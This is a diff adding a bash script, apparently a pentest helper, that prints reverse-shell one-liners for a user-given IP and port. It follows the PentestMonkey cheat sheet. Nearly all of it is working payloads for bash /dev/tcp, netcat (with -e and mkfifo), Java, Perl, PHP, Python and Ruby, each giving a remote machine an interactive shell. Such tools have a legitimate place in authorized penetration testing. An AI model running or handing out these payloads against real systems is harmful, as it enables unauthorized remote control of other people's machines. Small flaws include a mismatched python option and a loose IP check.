@@ -1,0 +1,163 @@
+#!/bin/bash
+# 
+# This script display the reverse Shell Cheat Sheet by kind select by user.
+#   - User also can pass the IP and port to make ajust in script output.
+#
+# This script use the PentestMonkey reverse Shell Cheat Sheet [1] and
+# Reverse-shell-one-liners [2].
+#
+# [1] http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+# [2] https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html
+#
+# Autor: Marcio de Souza Oliveira <marciosouza@debian.org>
+# Licensed by GPL-3
+
+set -e
+
+#Global Variables
+VERSION='0.1'
+USE="Usage: $(basename $0) -i ip:port -l shell-type"
+IP=""
+PORT=""
+LANGUAGE=""
+
+#Default options
+DISPLAY_ALL="True"
+
+display_help () {
+	echo -e "$USE\n"
+	echo "Display reverse shell syntax for supported languages."
+	echo
+	echo "OPTIONS"
+    echo "-h            Display this help"
+	echo "-i IP:PORT    The target IP and port to reverse shell connect"
+	echo "-l shell-type The supported reverse shell kind to display syntax"
+    echo "                                                                  "
+    echo -e "Are support the following kinds: \033[1mbash, netcat, java, perl, php, python2, python3, xterm.\033[m"
+    echo "                                                                  "
+	echo -e "\n $(basename "$0") version "$VERSION""
+}
+
+
+check_ip () {
+        #This function check if received IP is valid
+        if [[ "$1" =~ ^[1-2]?[0-5]?[0-9].[[1-2]?[0-5]?[0-9].[[1-2]?[0-5]?[0-9].[[1-2]?[0-5]?[0-9]$ ]]
+        then
+            export IP="$1"
+        else
+             echo "[!] Error! The received IP is invalid!"
+             echo
+             display_help && exit 1
+        fi
+}
+
+check_port () {
+        #This function check if received PORT is valid
+        if [[ "$1" -gt 0 ]] && [[ "$1" -le 65535 ]]
+        then
+            export PORT="$1"
+        else
+             echo "[!] Error! The received PORT is invalid"
+             echo
+             display_help && exit 1
+        fi
+}
+
+display_reverse_shell_cheat () {
+    # Receveid the language and display the correct reverse shell syntax
+    if [ "$#" != 0 ]
+    then
+        case "$1" in
+            bash)
+                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [bash]\033[m"
+                echo -e "\t\033[1mbash -i >& /dev/tcp/$IP/$PORT 0<&1"
+                ;;
+            netcat)
+                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [netcat]\033[m"
+                echo -e "\033[31m\033[1mAlternative with -e working:\033[m"
+                echo -e "\t\033[1mnc -e /bin/sh $IP $PORT\033[m"
+                echo -e "\033[31m\033[1mAlternative withput -e:\033[m"
+                echo -e "\t\033[1mrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f\033[m"
+                ;;
+            java)
+                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [java]\033[m"
+                echo -e "\t\033[1mr = Runtime.getRuntime()\033[m"
+                echo -e "\t\033[1mp = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])\033[m"
+                echo -e "\t\033[1mp.waitFor()\033[m"
+                ;;
+            perl)
+                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [perl]\033[m"
+                echo -e "\033[31m\033[1mFor Linux hosts:\033[m"
+                echo -e  "\t\033[1mperl -e 'use Socket;\$i=\"$IP\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\033[m"
+                echo -e "\033[31m\033[1mFor Linux hosts without /bin/sh:\033[m"
+                echo -e "\t\033[1mperl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$IP:$PORT\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'\033[m"
+                echo -e "\033[31m\033[1mFor Windows hosts:\033[m"
+                echo -e "\t\033[1mperl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$IP:$PORT\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'\033[m"
+                ;;
+            php)
+                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [php]\033[m"
+                echo -e "\t\033[1mphp -r '"'$sock'"=fsockopen(\"$IP\","$PORT");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+                ;;
+            python)
+                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [python2]\033[m"
+                echo -e  "\t\033[1mpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\033[m"
+                ;;
+            python3)
+                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [python3]\033[m"
+                echo -e  "\t\033[1mpython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\033[m"
+                ;;
+            ruby)
+                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [ruby]\033[m"
+                echo -e "\033[31m\033[1mFor Linux hosts:\033[m"
+                echo -e "\t\033[1mruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$IP\",\"$PORT\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\033[m"
+                echo -e "\033[31m\033[1mFor Windows hosts:\033[m"
+                echo -e "\t\033[1mruby -rsocket -e c=TCPSocket.new(\"$IP\",\"$PORT\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+                ;;
+            xterm)
+                echo "xterm"
+                ;;
+            *)
+                ;;
+        esac
+    else
+            display_help && exit 1
+    fi
+}
+
+
+if [ "$#" != 0 ]
+then
+	while true
+	do
+		case "$1" in
+			-h|--help)
+				display_help && exit 0
+				;;
+            -i)
+				IP="$(echo $2 | cut -d: -f1)"
+                PORT="$(echo $2 | cut -d: -f2)"
+				shift 2
+				;;
+			-l|--language)
+				LANGUAGE="$2"
+                shift 2
+				;;
+			-*)
+				display_help && exit 1
+				;;
+			*)
+				if [ "$#" = 0 ]
+				then
+					break
+				else
+					display_help && exit 3
+				fi
+				;;
+		esac
+	done
+else
+	display_help && exit 2
+fi
+
+check_ip "$IP" && check_port "$PORT"
+display_reverse_shell_cheat "$LANGUAGE"
